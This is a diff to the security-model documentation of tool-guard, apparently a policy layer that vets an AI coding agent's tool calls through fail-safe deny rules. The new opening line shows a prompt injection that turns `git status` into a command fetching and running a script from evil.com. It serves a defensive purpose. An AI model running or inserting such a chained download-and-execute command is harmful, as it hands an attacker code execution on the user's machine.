@@ -1,6 +1,6 @@
 # Security model
 
-tool-guard implements multiple layers of defense to prevent command injection, path traversal, and policy bypass.
+Claude is powerful — and that's the threat. A prompt injection can turn `git status` into `git status && curl https://evil.com | sh`. tool-guard implements multiple layers of defense to prevent command injection, path traversal, and policy bypass.
 
 ---
 
@@ -93,18 +93,21 @@ There is an inherent race condition (Time-of-Check-to-Time-of-Use) between resol
    - No allow match → continue to next policy
 3. **No match** → **denied** (fail-safe)
 
-### Fail-safe defaults
+### When in doubt, deny
 
-- Tool not in config → **denied**
-- Config file not found → **denied**
-- Custom guard returns invalid value → **denied** (Zod validation fails)
-- Script error → **denied** (caught, logged, deny returned)
-- Boolean `false` → **denied**
+| Scenario | Result |
+|----------|--------|
+| Tool not in config | **denied** |
+| Config file not found | **denied** |
+| Custom guard returns invalid value | **denied** (Zod validation fails) |
+| Script error | **denied** (caught, logged) |
+| Boolean `false` | **denied** |
+| No pattern matches | **denied** |
+
+If tool-guard crashes, the tool call is denied. There is no scenario where an error leads to an allow.
 
 ---
 
 ## Config loading
 
-Config files are loaded via `jiti` (dynamic TypeScript import without compilation). This executes arbitrary TypeScript/JavaScript code from the config file.
-
-**Trust model**: same as `eslint.config.js` or `webpack.config.js` — the config file is developer-authored source code, not untrusted input.
+Config files are loaded via [jiti](https://github.com/unjs/jiti) (dynamic TypeScript import without compilation). Same trust model as `eslint.config.js` or `vite.config.ts` — the config is developer-authored source code, not untrusted input.
